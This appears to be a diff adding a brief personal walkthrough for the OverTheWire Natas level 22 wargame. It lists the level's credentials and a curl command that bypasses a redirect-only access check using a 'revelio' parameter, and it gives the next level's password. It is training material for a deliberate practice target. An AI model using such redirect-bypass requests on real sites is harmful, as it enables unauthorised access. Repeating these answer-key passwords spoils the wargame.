@@ -1,0 +1,9 @@
+URL: http://natas22.natas.labs.overthewire.org
+user: natas22
+password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+Security using "Location: /" header.
+Bypass the redirect using curl, that ignores redirects by default.
+curl http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org/\?revelio\=1
+
+natas23 pass: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
